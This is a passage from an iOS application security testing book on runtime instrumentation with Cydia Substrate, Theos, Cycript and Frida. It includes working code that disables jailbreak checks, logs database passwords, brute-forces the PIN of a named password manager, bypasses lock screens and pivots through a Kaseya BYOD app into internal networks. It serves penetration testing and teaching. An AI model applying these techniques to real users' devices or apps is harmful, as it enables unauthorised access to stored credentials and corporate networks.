library.\nInstrumentation is the process of tracing, debugging, or otherwise profiling the execution of an application at\nruntime. It is an essential part of a security professional’s application assessment methodology and you will\nlikely use it during every assessment. Example use cases include (but are not limited to) the following:\nBypassing jailbreak detection\nStealing sensitive data such as encryption keys from an application\nForce-loading view controllers to access hidden content\nAttacking local authentication\nPivoting to internal networks with corporate applications\nDemonstrating the risks of malware\nInspecting a custom encryption protocol\nIndeed many scenarios exist when you can use instrumentation to your advantage. By far the simplest language\nto instrument in iOS applications is Objective-C.\nObjective-C uses a traditional message-passing system within the runtime rather than using direct function calls\nor making function calls via vtables for dynamic dispatch. That is, to invoke a function you pass it a message,\nproxying through the runtime’s objc_msgSend() function, allowing the implementation for a method to be\nresolved at runtime. Therefore it stands to reason if you are in a position to simulate calls to objc_msgSend()\nwithin an application, you are able to instrument it.\nIn addition to simulating message calls to invoke methods, directly replacing the implementation of a method at\nruntime is also possible; this concept is known as method swizzling. As previously noted, method\nimplementations are resolved at runtime. To achieve this, a class maintains a dispatch table, which is essentially\na map of selectors to implementations. In simple terms, the selector is used to represent the name of a method,\nwhereas the implementation is a pointer to the start of the function. Method swizzling is achieved by replacing\nthe implementation for an existing selector in a class’s dispatch table. It also allows the old implementation to\nbe called where necessary by registering a new selector that points to the original implementation.\nAlthough we explore this in greater detail later in this section, in brief, this technique is how the Objective-C\nruntime can be manipulated.\nThe Swift programming language, however, relies more heavily on the compiler, using direct function calls and\nvtable lookups. This implementation has some side effects for instrumentation in that you can only instrument\nclasses using the message-passing technique described previously that extend NSObject or use the @objc\ndirective. Fortunately, though, almost all of the iOS SDK extends NSObject or uses the @objc directive for the\ntime being. Functions that are invoked using direct function calls and via vtables require more effort to\ninstrument, and you must use techniques more akin to hooking C/C++.\nIntroduction to Cydia Substrate\nCydia Substrate (http://www.cydiasubstrate.com/) is a powerful runtime manipulation framework created by\nsaurik, that can be used to instrument C/C++ or Objective-C/Swift applications on iOS. Also note that the\nframework offers support for Android, as detailed in Chapter 7. Cydia Substrate is an inherent part of many of\nthe jailbreaks so in most cases it comes pre-installed with Cydia; if it is not installed on your jailbroken device,\nyou can enable it by installing the mobilesubstrate and com.saurik.substrate.safemode packages from the\nhttp://apt.saurik.com/ Cydia repository.\nSubstrate extensions, or tweaks as they are more commonly known, can be developed using the Cydia Substrate\nC API. Extensions are then compiled as dynamic libraries and must match the architecture of the device you\nneed to use the extension on.\nTo install an extension you simply place the compiled dynamic library in the\n/Library/MobileSubstrate/DynamicLibraries directory for it to be loaded into an application by MobileLoader,\nwhich is the component of the Substrate framework responsible for processing extensions. To prevent your\nextension being loaded into every newly created process, Substrate supports filters. Filters are property list files\nin either binary plist, XML, or JSON format and should be named using the same convention as your tweak,\nwith the .plist file extension. For example, the following directory listing shows an extension named\nmdsectweak.dylib with the associated filter file mdsectweak.plist:\nIpod10:/Library/MobileSubstrate/DynamicLibraries root# ls -la\ntotal 1544\ndrwxr-xr-x 2 root staff 204 Oct 24 16:12 ./\ndrwxr-xr-x 4 mobile staff 170 Oct 24 16:11 ../\n-rwxr-xr-x 1 root staff 85472 Oct 24 16:11 MobileSafety.dylib*\n-rw--r–r-- 1 root staff 118 Oct 24 16:11 MobileSafety.plist\n-rw--r-xr-- x 1 root staff 1485584 Oct 24 16:12 mdsectweak.dylib*\n-rw-r–r– 1 root staff 304 Oct 24 16:12 mdsectweak.plist\nIpod10:/Library/MobileSubstrate/DynamicLibraries root#\nThe contents of the mdsectweak.plist file are as follows:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>Filter</key>\n<dict>\n<key>Bundles</key>\n<array>\n<string>com.mdsec.lab1-1a</string>\n</array>\n</dict>\n</dict>\n</plist>\nAs shown in the preceding filter file, the mdsectweak.dylib tweak will only be injected into applications with the\nbundle identifier com.mdsec .lab1-1a. In addition to the Bundles filter, filtering by executable name and to\napplications that implement a specific class using the Executables or Classes keys is also possible. Filters are\nnot limited to a single constraint. Filtering using multiple keys is also possible; for example, consider the\nfollowing JSON filter file:\nFilter = {\nExecutables = (\"mdsecapp\");\nBundles = (\"com.mdsec.mdsecapp\");\n};\nWhen using multiple filters, all conditions must match for injection to take place, and therefore in this example\nthe tweak would only be injected into an application with the name mdsecapp and the bundle identifier\ncom.mdsec .mdsecapp. However, changing this behavior is possible using the Mode key and the value Any, which\nmeans any filter should match, as shown here:\nFilter = {\nExecutables = (\"mdsecapp\");\nBundles = (\"com.mdsec.mdsecapp\");\nMode = \"Any\";\n};\nUsing the Cydia Substrate C API\nThe previous section documented how to install and set up a Cydia Substrate extension so that it is injected into\nan application of choice. This section transitions on to discussing how the Cydia Substrate C API works and\nprovides some basic examples of how to implement tweaks so that you will have sufficient information to begin\nwriting your own.\nTo develop tweaks using the Substrate API a number of options are available to you, and your choice of\ndevelopment environment may be influenced by your host operating system:\niOSOpenDev (http://www.iosopendev.com/)—Provides Xcode integration and a number of templates for\ndeveloping tweaks. This environment is limited to OS X.\nTheos (https://github.com/DHowett/theos)—A cross-platform development environment. Known to work\non iOS, OS X, and Linux.\nCaptain Hook (https://github.com/rpetrich/CaptainHook/wiki)—A now dated wrapper for Substrate to\nsimplify function hooking. This environment is limited to OS X.\nFor simplicity and support, we recommend that you use the Theos development environment. Further\ninformation on how to use Theos is detailed in the subsequent sections of this chapter.\nYou’ll make use of four key functions in the Substrate API:\nMSHookFunction—This function is used to hook native code functions such as those developed in C or C++.\nConceptually, it instruments the function using a trampoline to divert the execution flow to a replacement\nfunction.\nMSFindSymbol—As the name suggests, this function is used to find symbols by name either within a specific\nimage or by searching all currently loaded images. This assumes that the symbol is exported, which is\nunlikely to be the case with stripped applications.\nMSGetImageByName—This function works in a similar way to dlopen() and causes an application to load a\ndynamic library if it is not already loaded.\nMSHookMessageEx—This function can be used to implement method swizzling of Objective-C functions or\nSwift functions that inherit from NSObject.\nThese functions make up the majority of the Substrate C API; with proper use of them, you’ll be able to\ninstrument any function in an iOS application. To illustrate how the API can be used, a walk-through of several\nextensions that hook both C and Objective-C functions is described next.\nThe first example instruments the stat() system call and is followed by a line-by-line analysis of the extension:\n1: #include <substrate.h>\n2: #include <sys/stat.h>\n3:\n4: static int (*oldStat)(const char *path, struct stat *buf);\n5:\n6: int newStat(const char *path, struct stat *buf)\n7: {\n8: NSLog(@\"Stat hooked - checking for bash\");\n9: if (strcmp(path, \"/bin/bash\") == 0)\n10: return ENOENT;\n11:\n12: return oldStat(path, buf);\n13: }\n14:\n15: MSInitialize {\n16: MSHookFunction(stat, newStat, &oldStat);\n17: }\nLine 4: A function is created that Cydia Substrate populates with a stub to call the original stat() function.\nLines 6-13: This function will be jumped to when the original stat() function is called. It checks whether the\npath argument is equal to /bin/bash and if so, immediately returns an error indicating that the file does not\nexist.\nLine 12: If the path does not equal /bin/bash the function calls the oldstat() function, which causes the\noriginal system implementation of stat() to be invoked.\nLine 15:MSInitialize is a macro that applies the constructor attribute to the contained code, causing it to be\nthe first thing that is executed when the application loads.\nLine 16: The MSHookFunction causes stat() to be instrumented. MSHookFunction takes three arguments: the\nsymbol that you want to replace, in this case the address of the stat() function; the address of the function that\nyou want to replace it with—in the example this is the newStat() function; and finally a pointer to a function\nthat will be populated with the stub code to call the original implementation—in this case oldStat().\nAlthough this example is a simple one, you can use it as a template to instrument any library call on the device.\nHowever, sometimes you might find you need to instrument C/C++ functions that are built-in to the\napplication; if the symbol to the function appears in the export table then you can look it up using\nMSFindSymbol(), as shown on line 12 of the following example:\n1: #include <substrate.h>\n2: #include <sys/stat.h>\n3:\n4: static int (*oldEnableEncryption)();\n5:\n6: int newEnableEncryption()\n7: {\n8: return 0;\n9: }\n10:\n11: MSInitialize {\n12: void *EnableEncryption = MSFindSymbol(NULL, \"_EnableEncryption\");\n13:\n14: MSHookFunction(EnableEncryption, newEnableEncryption,\n15: &oldEnableEncryption);\n16: }\nOftentimes, though, you will find that the application binary has been stripped of unnecessary symbols; hence\nMSFindSymbol() cannot be used. In this scenario you will need to use the address of the function rather than\nMSFindSymbol(). This may look as follows, where 0xdeadbeef is a placeholder for the address of your function:\nunsigned int * EnableEncryption = (unsigned int *)0xdeadbeef;\nTo find the address of the function you should first disable PIE (using the tool described in\nhttp://www.securitylearn.net/tag/remove-pie-flag-of-ios-app/) if it is enabled, and then use a disassembler\n(for example, IDA Pro or Hopper) or debugger to find the address of the function you are interested in\ninstrumenting. This process has been somewhat simplified by the MS-Hook-C tool\n(https://github.com/hexploitable/MS-Hook-C) released by Grant Douglas. The tool scans the running\napplication’s memory looking for a signature of your target function and can be used to calculate its runtime\naddress. This is also the process that you need to follow to hook a Swift function that is not derived from\nNSObject.\nInstrumenting an Objective-C method, as opposed to a standard C or C++ function, has some substantial\ndifferences. First you need to extract and obtain the class and method definitions from the decrypted binary. The\nprocess of decrypting a binary and extracting the class information was detailed in Chapter 2 in the sections\n“Decrypting App Store Binaries” and “Inspecting Decrypted Binaries.” If you skipped these sections you should\nrefer to them to learn how to find the class and method names that can be used to inform tweak development.\nHere is an example extension that instruments the isJailbroken instance method of the SecurityController\nclass in a hypothetical app:\n1: #include <substrate.h>\n2:\n3: BOOL (*old_isJailBroken)(id self, SEL _cmd);\n4:\n5: BOOL new_isJailBroken(id self, SEL _cmd) {\n6: NSLog(@\"Hooked isJailbroken\");\n7: return NO;\n8: }\n9:\n10: MSInitialize\n11: {\n12: MSHookMessageEx(\n13: objc_getClass(\"SecurityController\"), @selector(isJailBroken),\n14: (IMP) new_isJailBroken, (IMP*)old_isJailBroken\n15: );\n16: }\nLine 3: In a similar way to the previous example, a function is created that is filled in with a stub to call the\noriginal implementation of the isJailBroken function if required.\nLines 5-8: A new function is created that simply returns NO whenever isJailBroken is called.\nLines 10-16: In a similar way to the previous example the MSInitialize macro is called to ensure the\nMSHookMessageEx function is called when an application first loads.\nLines 12-14: The implementation of the original isJailbroken function is replaced. MSHookMessageEx takes four\narguments; the first argument is the implementation of the class, in this case the implementation of the\nSecurityController class is looked up using objc_getClass(). The second is the selector that should be replaced\n—in this case isJailBroken, with the final arguments being the address of the new implementation and a\npointer to the stub that should be populated with the code to call the original.\nThis template can be used to instrument the instance method of any Objective-C class simply by modifying the\nclass, method names, and method arguments. However, you need to make a subtle adjustment if you want to\ncall a class method. For example, if the class method were,\n+ (BOOL) isJailBroken;\nthen the call to MSHookMessageEx() would be done as follows; note that the metaclass information is retrieved as\nopposed to class object:\nMSHookMessageEx(objc_getMetaClass(\"SecurityController\"),\n@selector(isJailBroken), (IMP) new_isJailBroken, (IMP*)old_isJailBroken);\nTweak Development Using Theos and Logos\nA common misconception in iOS application security is that you need an install of OS X and Xcode to do\ndevelopment. While it is true that using OS X eases many iOS development tasks, in most cases you can achieve\nthe same things using Theos.\nTheos is a cross-platform suite for developing and deploying iOS software without the need for Xcode. It is\nknown to work on multiple operating systems, including Mac OS X, Linux, and iOS. An important feature of\nTheos is the ability to develop Substrate extensions. Indeed, you can use Theos to compile and build all the\nexamples detailed in the previous section.\nTo use Theos you need a copy of the iOS toolchain compiled for your development OS and a copy of the iOS SDK\nthat is supported for the device that you want to run your tweak on. To obtain the iOS toolchain for Linux, refer\nto the project’s Google Code site (https://code.google.com/p/ios-toolchain-based-on-clang-for-linux/), and\nfor the on-device toolchain consult the BigBoss Cydia repository for the “iOS Toolchain” package. You can\ndownload and extract a copy of the SDK from the relevant Xcode package in the iOS Developer Center or from\nthe list of resources provided by D. Howett (http://iphone.howett.net/sdks/). You can find additional details\non how to set up your Theos environment on the iPhone Dev Wiki\n(http://iphonedevwiki.net/index.php/Theos/Setup).\nAfter you have Theos set up you are ready to start developing tweaks. To create a tweak first set up a Theos\nproject by running the nic.pl script as in the following output. Select option 5 and choose a name for your\nproject from the interactive menu:\nmdsec@ubuntu:~/Desktop$ ./iostools/theos/bin/nic.pl\nNIC 2.0 - New Instance Creator\n------------------------------\n[1.] iphone/application\n[2.] iphone/library\n[3.] iphone/preference_bundle\n[4.] iphone/tool\n[5.] iphone/tweak\nChoose a Template (required): 5\nProject Name (required): mahhtest\nPackage Name [com.yourcompany.mahhtest]: com.mdsec.mahhtest\nAuthor/Maintainer Name [mdsec]:\n[iphone/tweak] MobileSubstrate Bundle filter [com.apple.springboard]:\n[iphone/tweak] List of applications to terminate upon installation\n(space-separated, '-' for none) [SpringBoard]:\nInstantiating iphone/tweak in mahhtest/...\nDone.\nRunning the nic.pl script creates a new directory with the same name as your project, in your current working\ndirectory; in this case the directory is named mahhtest. Several files reside within your project directory.\nHowever, in most cases you will need to edit only the Tweak.xm file, which contains the source code for your\ntweak. Although you can directly use the Substrate C API (as per the examples in the previous section) by\nplacing them in the Tweak.xm file, you may want to consider using Logos\n(http://iphonedevwiki.net/index.php/Logos).\nLogos is a set of preprocessor directives that simplifies tweak development by providing a shortened, simpler\nsyntax to accomplish many common tasks. Some of the Logos directives that are likely to be useful include:\n%hook—Opens a hook block and allows you to hook a given class.\n%ctor—Injects a new constructor into the application.\n%orig—Calls the original implementation of a hooked function.\n%log—Writes details of a method and its arguments to the system log.\n%end—Used to close a %hook block.\nTo demonstrate how Logos directives can be used to simplify a substrate extension, consider the following\nexample, which is an equivalent implementation of the SecurityController isJailBroken example from the\nprevious section:\n%hook SecurityController\n- (BOOL)isJailBroken {\nreturn NO;\n}\n%end\nYou can retrieve the arguments passed to a function using the %log directive. If, for example, your application\nhas a function that made a connection to an encrypted database, you may be able to extract the password used to\nencrypt the database using a tweak similar to the following:\n%hook DatabaseController\n- (void)CreateDatabaseConnection:(NSString*)dbName pass: \\\n(NSString*)password {\n%log;\n%orig;\n}\n%end\nThis tweak causes the application to log the function arguments to the system log, which you can retrieve using\nsocat (http://theiphonewiki.com/wiki/System_Log) or via the Xcode devices window.\nAfter you create your tweak, compile it using the standard GNU make utility by typing make in your tweak\nproject’s directory:\nmdsec@ubuntu:~/Desktop/mahhtest$ make\nMaking all for tweak mahhtest...\nPreprocessing Tweak.xm...\nCompiling Tweak.xm...\nLinking tweak mahhtest...\nld: warning: -force_cpusubtype_ALL will become unsupported for ARM\narchitectures\nStripping mahhtest...\nSigning mahhtest...\nTo apply the tweak, upload the compiled dynamic library stored in the obj directory, to the\n/Library/MobileSubstrate/DynamicLibraries directory on the device. Theos also creates a filter plist file that\nyou can use to filter the applications that the tweak is injected into, as described earlier in this chapter; you can\nedit the filter file so that the tweak is only applied to the application you are interested in testing.\nInstrumentation Using Cycript\nA particularly useful tool that should be part of any security tester’s arsenal is Cycript\n(http://www.cycript.org/). Cycript is a runtime instrumentation tool for iOS applications that blends\nJavaScript and Objective-C. It allows you to programmatically instrument iOS applications by injecting into the\nruntime through an interactive console. The foundations of Cycript are built upon Substrate, which is\nunderstandable given they are developed by the same author, saurik. A useful feature of Cycript is the ability to\naccess and manipulate existing objects in a running application. The benefit of this is that you can allow your\napplication to enter the state that you require, populate relevant objects, and then inject and start to manipulate\nexisting objects as you want. To install Cycript on your device simply install the “cycript” package from the\nhttp://cydiasaurik.com repository.\nCycript is useful in a number of situations. Some examples where you may find it useful in a security\nassessment are:\nBrute-forcing local authentication\nStealing data such as encryption keys from populated objects\nForce loading of view controllers\nTo use Cycript to inject into a running application, from the device simply invoke Cycript with the process ID or\nname of the application:\nIpod10:~ root# cycript -p BookExamples\ncy#\nCycript creates a bridge to Objective-C via a JavaScript-like interpreter, allowing you to access and manipulate\nObjective-C classes, methods, and objects from the Cycript console, as shown in the following simple example:\ncy# var hello = [[NSString alloc] initWithString:\"Hello\"];\n@\"Hello\"\ncy# hello.length\n5\ncy# hello = [hello stringByAppendingString: \" world\"];\n@\"Hello world\"\ncy#\nUsing Cycript’s JavaScript-like syntax, you can programmatically manipulate your application, and even create\nnew functions. Here is an example of creating a simple function:\ncy# function counter() { for(var i=0; i<5; i++) system.print(i); }\ncy# counter()\n0\n1\n2\n3\n4\nAccessing and manipulating existing objects in an application is also possible provided you are able to find the\ninstance of the object. Typically, you have two ways to find it. For the first method, many applications export\ngetter class methods that can be statically invoked and return the instance of an object. For example, you may\nsee something like this in an application’s class-dump-z output:\n@interface UserContext : XXUnknownSuperclass\n<UserContextViewControllerDelegate> {\n}\n+(id)sharedInstance;\nIn these scenarios getting access to this object is relatively simple, and just calling the sharedInstance method\nwill get you access to the instance of the object:\ncy# var UserContext = [UserContext sharedInstance]\n#\"<UserContext: 0x17e86be0>\"\ncy#\nIf, however, there is no class method to return an instance, you will need to find the address of the object you’re\ninterested in by other means. One of the simplest ways to do this is using the Objective-C classes view in Snoop-\nit, which is discussed in greater detail later in this chapter. After you have the address of the instance you can\naccess the object using Cycript as follows:\ncy# var UserContext = new Instance(0x17e86be0)\n#\"<UserContext: 0x17e86be0>\"\ncy#\nAll applications have a shared instance. You can access your application’s instance using the UIApp variable,\nwhich is a shortcut for the [UIApplication sharedApplication] class method. This example shows that the\naddresses for [UIApplication sharedApplication] and UIApp are identical:\ncy# UIApp\n#\"<UIApplication: 0x542930>\"\ncy# [UIApplication sharedApplication]\n#\"<UIApplication: 0x542930>\"\ncy#\nThe UIApplication\n(https://developer.apple.com/library/ios/documentation/uikit/reference/UIApplication_Class/index.html\ninstance is interesting from a penetration tester’s perspective because it’s a centralized point of control for the\napplication and manipulating it can have important consequences for an app. For example, to find out which\nwindows are currently loaded in the application you can use the UIApp.windows[] array, whereas the window\nthat was most recently made visible and therefore the most likely to be currently visible in the user interface can\nbe found in the UIApp.keyWindow variable.\nArmed with this basic knowledge on how to use Cycript you can start to instrument applications. The following\nsections detail and explain some practical examples of using Cycript.\nForce Loading View Controllers Using Cycript\nTo demonstrate how view controllers can be force loaded, we’ll demonstrate an example using the Password\nManager Free (https://itunes.apple.com/gb/app/password-manager-free-secure/id547904729) application.\nPhysical access to the Password Manager application is protected using a lock screen; opening the application\nloads a password entry view.\nThe application is first decrypted and extracted from the device. The app’s class definitions are then extracted\nusing class-dump-z. Examining the class-dump-z output reveals a number of views, including the following:\n@interface MainView : XXUnknownSuperclass <UITableViewDelegate,\nUITableViewDataSource, UITabBarDelegate, InputViewDelegate,\nUIActionSheetDelegate, UISearchBarDelegate, UIAlertViewDelegate> {\nWith the application loaded in the foreground, you attach to it with Cycript and attempt to force-load a new view\ncontroller by allocating and initializing a new object of type MainView:\ncy# UIApp.keyWindow.rootViewController = [[MainView alloc] init];\n#\"<MainView: 0x16edbc70>\"\ncy#\nForce loading the view controller causes the currently loaded window to change without your having to enter\nthe lock screen password. In this case the main menu is loaded, thereby bypassing the lock screen\nauthentication view, as shown in Figure 3.22.\nFigure 3.19 Bypassing the Password Manager lock screen\nFigure 3.20 Pivoting to internal networks in Kaseya BYOD\nFigure 3.21 View of the Snoop-it application\nFigure 3.22 The Snoop-it Objective-C classes view\nBrute-Forcing Local Authentication\nMany applications implement screen locks to prevent users with physical access from entering the application.\nHowever, instrumenting the runtime in these applications to bypass authentication is often possible.\nImplementing a lock screen brute-force is illustrated next using the Safe Password Free\n(https://itunes.apple.com/gb/app/safe-password-free-for-iphone/id482919221) application as an example.\nThe application is a typical password manager and can be used to store passwords for generic websites, bank\naccounts, email accounts, and other sensitive applications. Physical access to the application is protected by a\nlock screen, which requires a PIN code to be entered when the application is first launched. If you decrypt the\napplication, extract it from your device, and then extract its class definitions (using class-dump-z), you will\nobserve a number of potentially interesting methods, one of which is the checkPassword method in the\napplication’s delegate class:\n-(BOOL)checkPassword:(id)password;\nYou can use Cycript to inject into the application, at which point you can invoke this method and observe its\nbehavior:\ncy# [UIApp.delegate checkPassword:\"9876\"]\n0\ncy#\nThe method returns a Boolean value, which indicates whether the password is correct. The PIN to the\napplication is a simple four-digit numeric value, meaning that the key space for the PIN code has 10^4, or\n10,000 possible combinations. You can use Cycript to launch such a brute-force attack, as shown here:\ncy# var pin=0;\n0\ncy# function bruteScreenlock()\ncy> {\ncy> for(var i=1200; i<1300; i++)\ncy> {\ncy> var result = [UIApp.delegate checkPassword:\"\"+i];\ncy> if(result==\"1\") pin=i;\ncy> }\ncy> }\ncy# bruteScreenlock()\ncy# print:pin;\n1234\ncy#\nFor the purposes of the demonstration the loop iterates between 1200–1300 calling the checkPassword method\nwith a string representation of the current value of the counter. If the return value of checkPassword is equal to\n1, then the pin attempted was correct, and the bruteScreenlock function completes, highlighting that the screen\nlock PIN was successfully found.\nPivoting to Internal Networks\nMany enterprise applications integrate into internal networks, providing users with access to things like internal\nfile shares, intranet applications, and email. Examples of these types of applications include bring-your-own-\ndevice (BYOD) and mobile device management (MDM) applications, both of which are widely used in corporate\nenvironments. These applications are particularly interesting because if not properly secured they may act as a\npivot to a corporate internal network for any attacker who has compromised the device. To demonstrate this, we\ndescribe an attack against Kaseya BYOD (http://www.kaseya.com/solutions/byod).\nKaseya provides a suite of applications to access documents and email and to facilitate secure web browsing.\nOrganizations install the Kaseya gateway on their network perimeter to provide access to internal services such\nas intranet applications and file shares; these can then be accessed via the Kaseya Secure Browser or Kaseya\nSecure Docs applications. You can configure these applications to connect directly to your Kaseya gateway or\nrouted via the Kaseya relay infrastructure; these act as a proxy to your gateway. An interesting consequence of\nthis feature is that in the event of an on-device compromise, without any form of authentication, you can exploit\nthis functionality to tunnel requests to internal networks. The following Cycript function was developed to\ndemonstrate this:\nfunction doTunneledWebRequest(host)\n{\nvar url = [[NSURL alloc] initWithString:host];\nvar nsurl = [[NSURLRequest alloc] initWithURL:url];\nvar rvhttpurl = [[RVHTTPURLProtocol alloc] init];\nvar helper = [RVHTTPURLProtocolLocalStorageHelper initialize];\n[rvhttpurl initWithRequest:nsurl cachedResponse:null client:[rvhttpurl\nclient]];\nrvhttpurl->isa.messages['connectionDidFinishLoading:'] = function() {};\n[rvhttpurl startLoading];\n[NSThread sleepForTimeInterval:5];\nvar str = [[NSString alloc] initWithData:rvhttpurl->encryptedResponse\nencoding:0x5];\nvar headerlen = [str rangeOfString:\"\\n\\n\"].location;\nvar b64header = [str substringToIndex:headerlen];\nvar encryptedheaders = [NSData rlDataFromBase64String:b64header];\nvar rvcrypt = [[RVCryptor alloc] init];\n[rvcrypt usePasswordData:rvhttpurl->answerKey error:\"\"];\nvar headers = [[NSString alloc] initWithData:[rvcrypt\ndecryptData:encryptedheaders error:\"\"] encoding:0x5];\nvar encryptedbody = [str substringFromIndex:b64header.length+2];\nvar body = [[NSString alloc] initWithData:[rvcrypt\ndecryptData:[encryptedbody dataUsingEncoding:0x5] error:\"\"] encoding:0x5];\nvar response = [[NSString alloc] initWithFormat:\"%@%@%@\", headers, \"\\n\",\nbody];\nreturn response;\n}\nAlthough this may look relatively complex, the function does little more than set up the necessary objects in the\nKaseya Browser application, which are then used to make an encrypted request to the Kaseya proxy. Upon\nreceiving the encrypted response, the Cycript code then decrypts it. Figure 3.20 shows the result of running the\nfunction with Cycript injected while the application is locked.\nInstrumentation Using Frida\nFrida (http://www.frida.re/) is a powerful cross-platform framework for instrumenting applications on\nWindows, OS X, Linux, and iOS. Unlike most of the instrumentation tools on iOS, Frida does not use Substrate\nunder the hood; instead, it is a fully standalone framework that requires no modifications to the device other\nthan running the frida-server binary. Frida has a client-server architecture, and after frida-server is running\non the device it can be controlled over USB (or with some modifications, over the network) by a Frida client\nrunning on your workstation. Frida clients communicate over a bidirectional channel using the Frida Python\nAPI; however, the actual debugging logic happens using JavaScript.\nTo install Frida on your device, simply install the com.tillitech.frida-server package from the\nhttp://ospy.org Cydia repository. To install Frida on the client side you can install using easy_install:\nsudo easy_install frida\nAfter Frida is installed on both the device and your workstation, and the device is plugged in via USB, you can\ntest whether your Frida setup is working using the following command, which should return a list of processes\nrunning on the iOS device:\nredpill:~ dmc$ frida-ps -U\nPID NAME\n383 Calendar\n220 Mail\n210 AGXCompilerServi\n39 AppleIDAuthAgent\n24 BTServer\n150 BlueTool\n355 CloudKeychainPro\n25 CommCenter\n11588 DTMobileIS\n202 DuetLST\nBefore you start using Frida to instrument applications, you should familiarize yourself with the JavaScript API\n(http://www.frida.re/docs/javascript-api/).\nA useful feature of Frida is the frida-trace utility that you can use to trace function calls in your application.\nThis can be useful in a number of circumstances, such as for monitoring API calls used for encryption and\ndecryption, or for inspecting the network connections that an application makes. For details on how to trace\napplications using Frida, consult the demonstration in Frida’s iOS documentation\n(http://www.frida.re/docs/ios/).\nHowever, the reason you may want to use Frida in place of the Substrate-based tools is due to the excellent\nPython bindings the tool offers. The example here can help get you up and running with Frida.\nWith the device connected to your workstation via USB, first load Python and import the Frida module:\nredpill:~ dmc$ python\nPython 2.7.5 (default, Mar 9 2014, 22:15:05)\n[GCC 4.2.1 Compatible Apple LLVM 5.0 (clang-500.0.68)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> import frida\n>>>\nTo see whether your client is able to talk to the Frida server, use the enumerate_ devices()method to list the\ncurrently connected devices:\n>>> frida.get_device_manager().enumerate_devices()\n[Device(id=1, name=\"Local System\", type='local'), Device(id=2,\nname=\"Local TCP\", type='remote'), Device(id=3, name=\"iPad 4\",\ntype='tether')]\n>>>\nTo attach to a process on the device, use the attach()method, providing either a process ID or process name:\n>>> process =\nfrida.get_device_manager().enumerate_devices()[2].attach(1161)\n>>>\nTo see the currently loaded modules in your application, use the enumerate_ modules()method; and to see the\nnames of the currently loaded modules, iterate through this list:\n>>> for module in process.enumerate_modules():\n... print module.name\n...\nBookExamples\nMobileSubstrate.dylib\nCoreGraphics\nUIKit\nFoundation\nlibobjc.A.dylib\nlibSystem.B.dylib\nCoreFoundation\nSecurity\nlibswiftCore.dylib\nlibswiftDarwin.dylib\nlibswiftDispatch.dylib\nlibswiftFoundation.dylib\nlibswiftObjectiveC.dylib\nTo start instrumenting the runtime in an application, you’ll need to use the JavaScript API. To load and execute\na script in your application’s runtime do the following:\n>>> def on_message(message, data):\n... print(message)\n...\n>>> jscode = \"\"\"\n... send(\"hello world\")\n... \"\"\"\n>>> session = process.session\n>>> script = session.create_script(jscode)\n>>> script.on('message', on_message)\n>>> script.load()\n>>> {u'type': u'send', u'payload': u'hello world'}\n>>>\nThis simple example first registers a callback function named on_message(). The callback is used to pass objects\nfrom JavaScript and your application back to the Python bindings, via the send() JavaScript function. Next a\nscript is created and executed in the process’s session, which executes the JavaScript contained in the jscode\nvariable. In this example, the JavaScript code simply passes the “hello world” string back to the application.\nTo start instrumenting the application’s runtime you must write some JavaScript code. As previously noted, you\nshould familiarize yourself with the JavaScript API before delving in to Frida development, but to get you\nstarted we provide some examples here.\nTo access an Objective-C object from JavaScript use the ObjC.use() method:\nvar NSString = ObjC.use(\"NSString \");\nTo allocate a new instance of NSString, use the standard Objective-C method, alloc():\nvar NSString = ObjC.use(\"NSString\").alloc();\nTo call a method on the newly created object, invoke it just as you would a method on a JavaScript object,\nensuring you replace the “:” with “_” in the naming scheme:\nvar test = ObjC.use(\"NSString\").alloc().initWithString_(\"test\");\nTo find a list of all the currently available classes in the application you can use the ObjC.classes variable,\nwhich when passed to the Python instance running on your workstation via a callback will result in output\nsimilar to the following:\n>>> {u'type': u'send', u'payload': [u'MFDeliveryResult',\nu'AVCaptureAudioChannel', u'UIPopoverButton', u'CDVWhitelist',\nu'OS_xpc_shmem', u'AASetupAssistantSetupDelegatesResponse',\nu'MPMediaCompoundPredicate', u'NSCache', u'ML3PersistentIDGenerator',\nu'GEOTileEditionUpdate', u'UIPrintStatusJobTableViewCell',\nu'SAMPSetQueue',\nu'ABSectionListVibrantHeaderView', u'WebSecurityOrigin',\nu'_UIMotionAnalyzerHistory', u'PFUbiquityFileCoordinator',\nu'AAUpgradeiOSTermsResponse', u'NSGlyphNameGlyphInfo',...\nThese simple illustrations should be sufficient to help you start writing your own Frida scripts to instrument\nreal apps. Let’s look at an example that demonstrates how you can use Frida to break a real-world applications.\nEarlier in this chapter you saw an example of how you could exploit the Kaseya Browser application to pivot to\nan internal network. In this example you will see how the Kaseya Browser application can be easily\ninstrumented using Frida so that the screen lock is bypassed.\nWhen the application is launched, physical access to the application’s internal functionality is protected using a\nscreen lock, similar to that in Figure 3.20.\nAnalysis of the application’s class information reveals the following method:\n@interface RVSuiteStorage : _ABAddressBookAddRecord\n{\n}\n+ (void)setPasscode:(id)fp8;\nAs implied by the method name, invoking it sets the passcode for the screen lock, causing any previous\npasscodes to be overwritten. To invoke this method using Frida, you can use the following Python script:\nimport frida,sys\njscode = \"\"\"\nvar RVSuiteStorage = ObjC.use(\"RVSuiteStorage\");\nRVSuiteStorage.setPasscode_(\"9876\");\n\"\"\"\nprocess = frida.get_device_manager().enumerate_devices()[2].attach(1179)\nsession = process.session\nscript = session.create_script(jscode)\nscript.load()\nRunning this Frida script resets the application’s screen lock passcode to 9876. If you have physical access, you\ncan now log in to the application using this code!\nInstrumenting the Runtime Using the Dynamic Linker\nSo far we’ve covered how to instrument the runtime using Substrate and Frida. However, you can use another\nrelatively simple technique to instrument methods in a target iOS app. Linux users may be aware of the\nLD_PRELOAD environment variable that can be used to dynamically load a library into a process, whereas Mac OS\nX has a similar equivalent environment variable named DYLD_INSERT_LIBRARIES. iOS also allows runtime\nmethod replacement using the same technique.\nTo demonstrate this, consider the earlier example of the [SecurityController isJailBroken] jailbreak\ndetection function that returned a Boolean, a yes or no on whether the device is jailbroken. The objective of the\nattack is to replace the method implementation so that it always returns no so that the device is never\nrecognized as jailbroken.\nFollowing is a simple implementation of a dynamic library that uses method swizzling to replace a method’s\nimplementation:\n#include <stdio.h>\n#include <objc/objc.h>\n#import <Foundation/Foundation.h>\n#include <objc/runtime.h>\nBOOL (*old_isJailBroken)(id self, SEL _cmd);\nBOOL new_isJailBroken(id self, SEL _cmd)\n{\nNSLog(@\"Hooked 